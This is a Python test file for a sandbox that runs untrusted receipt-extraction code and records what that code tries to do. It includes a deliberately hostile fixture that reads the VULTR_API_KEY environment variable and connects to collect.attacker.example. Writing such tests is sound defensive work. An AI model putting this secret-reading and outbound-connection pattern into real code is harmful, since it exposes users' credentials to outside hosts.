"""Receipt logic, run WITHOUT a container (no walls here: this checks what we record, not what stops it)."""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from app import sandbox  # noqa: E402


def local(room, work, caps):
    return [sys.executable, "-I", os.path.join(work, "runner.py"), work]


GOOD = '''
def extract(path):
    text = open(path).read()
    return {"fields": {"vendor": "Bonneville Sheet Metal Supply", "total": "736.81"}, "text": text}
'''

NOSY = '''
import os, socket
def extract(path):
    key = os.environ.get("VULTR_API_KEY")
    try:
        socket.create_connection(("collect.attacker.example", 80), timeout=0.2)
    except OSError:
        pass
    return {"fields": {"vendor": "Jordan River Plumbing Co."}, "text": open(path).read()}
'''


class Receipt(unittest.TestCase):
    def test_clean_file(self):
        r = sandbox.run(b"INVOICE BSM-24117 Total $736.81", GOOD, sandbox.Caps(seconds=10), cmd_for=local)
        self.assertEqual(r.result["fields"]["total"], "736.81")
        self.assertEqual(r.attempts, [])
        self.assertGreaterEqual(r.destroyed, r.started)
        self.assertEqual(r.secrets_inside, 0)

    def test_attempts_are_recorded(self):
        r = sandbox.run(b"JRP-7781", NOSY, sandbox.Caps(seconds=10), cmd_for=local)
        whats = [a["what"] for a in r.attempts]
        self.assertIn("getenv", whats)
        self.assertTrue(any(w.startswith("socket") for w in whats), whats)
        self.assertEqual(r.result["fields"]["vendor"], "Jordan River Plumbing Co.")

    def test_timeout_is_killed_and_reported(self):
        r = sandbox.run(b"x", "def extract(p):\n    while True: pass\n", sandbox.Caps(seconds=2), cmd_for=local)
        self.assertEqual(r.killed_by, "timeout")
        self.assertIsNone(r.result)

    def test_step_error_is_reported_not_raised(self):
        r = sandbox.run(b"x", "def extract(p):\n    raise ValueError('bad pdf')\n", sandbox.Caps(seconds=5), cmd_for=local)
        self.assertIn("ValueError: bad pdf", r.error)

    def test_docker_command_has_every_wall(self):
        cmd = " ".join(sandbox.docker_cmd("cr-x", "/w", sandbox.Caps()))
        for wall in ("--network=none", "--read-only", "--memory=512m", "--pids-limit=128", "--cap-drop=ALL",
                     "no-new-privileges", "--user=65534:65534", "--runtime=runsc", ":/in:ro"):
            self.assertIn(wall, cmd)
        self.assertNotIn(" -e ", cmd)
        self.assertNotIn("--env", cmd)


if __name__ == "__main__":
    unittest.main()
